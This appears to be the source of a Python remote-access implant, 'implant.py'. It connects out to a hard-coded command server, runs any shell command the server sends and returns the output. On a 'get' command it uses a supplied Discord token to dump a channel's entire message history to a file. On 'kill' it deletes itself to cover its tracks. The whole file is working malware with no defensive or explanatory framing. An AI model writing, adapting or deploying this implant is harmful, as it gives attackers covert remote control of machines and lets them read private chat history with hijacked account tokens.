import socket
import subprocess
import json
import os
import discord
import asyncio

SERVER_IP = '172.31.23.98'
SERVER_PORT = 8080

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

async def start_logging_messages(token, channel_id):
    client = discord.Client(intents=discord.Intents.default())

    async def get_messages():
        channel = client.get_channel(channel_id)
        client_socket.sendall(f"Got channel {channel}".encode())

        if channel:
            messages = open('messages.txt', 'w')

            async for message in channel.history(limit=None):
                messages.write(f'{message.author}: {message.content}\n')
                client_socket.sendall("Wrote messages".encode())

    # Event handler for when the bot is ready
    @client.event
    async def on_ready():
        client_socket.sendall(f'Logged in as {client.user}'.encode())
        await get_messages()
        await client.close()

    await client.start(token)

while True:
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        break
    except ConnectionRefusedError:
        pass

while True:
    data = client_socket.recv(1024).decode().split(' ')

    if not data:
        break

    if data[0] == "kill":
        client_socket.sendall("Done".encode())
        client_socket.close()
        os.remove("implant.py")
    elif data[0] == "get":
        id = int(data[1])
        token = str(data[2])

        client_socket.sendall("Starting discord message logger".encode())
        asyncio.run(start_logging_messages(token, id))
        client_socket.sendall("Closed discord client".encode())
        client_socket.sendall("Done".encode())
    else: # any linux command
        p = subprocess.Popen(data, stdout=subprocess.PIPE)
        output = []

        for i in p.stdout.readlines():
            output.append(i.decode().strip())

        if len(output) != 0:
            client_socket.sendall(json.dumps(output).encode())

        client_socket.sendall("Done".encode())